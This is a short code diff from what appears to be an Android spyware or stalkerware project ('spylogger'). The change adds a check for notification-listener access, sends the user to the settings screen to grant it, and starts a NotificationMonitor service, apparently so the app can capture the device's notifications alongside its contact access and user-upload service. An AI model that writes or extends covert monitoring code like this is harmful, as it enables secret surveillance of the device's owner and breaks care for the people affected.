@@ -19,6 +19,7 @@ import android.os.Message;
 import android.provider.ContactsContract;
 import android.provider.Settings;
 import android.support.annotation.NonNull;
+import android.support.v4.app.NotificationManagerCompat;
 import android.support.v7.app.AppCompatActivity;
 import android.text.TextUtils;
 import android.util.Log;
@@ -36,6 +37,7 @@ import com.gravatasufoca.spylogger.dao.DatabaseHelper;
 import com.gravatasufoca.spylogger.helpers.NetworkUtil;
 import com.gravatasufoca.spylogger.helpers.TaskComplete;
 import com.gravatasufoca.spylogger.model.Configuracao;
+import com.gravatasufoca.spylogger.receivers.NotificationMonitor;
 import com.gravatasufoca.spylogger.repositorio.RepositorioConfiguracao;
 import com.gravatasufoca.spylogger.repositorio.impl.RepositorioConfiguracaoImpl;
 import com.gravatasufoca.spylogger.services.SendUsuarioService;
@@ -93,6 +95,19 @@ public class LoginActivity extends AppCompatActivity implements LoaderCallbacks<
             startService(intent);
         }
 
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR2) {
+            boolean weHaveNotificationListenerPermission = false;
+            for (String service : NotificationManagerCompat.getEnabledListenerPackages(this)) {
+                if (service.equals(getPackageName()))
+                    weHaveNotificationListenerPermission = true;
+            }
+            if (!weHaveNotificationListenerPermission) {
+                //ask for permission
+                Intent intent = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
+                startActivity(intent);
+            }
+        }
+        Utils.startService(getApplicationContext(), NotificationMonitor.class);
 
         if (NetworkUtil.NETWORK_STATUS_NOT_CONNECTED==NetworkUtil.getConnectivityStatusString(this)) {
             Toast.makeText(this, R.string.nao_conectado, Toast.LENGTH_LONG).show();
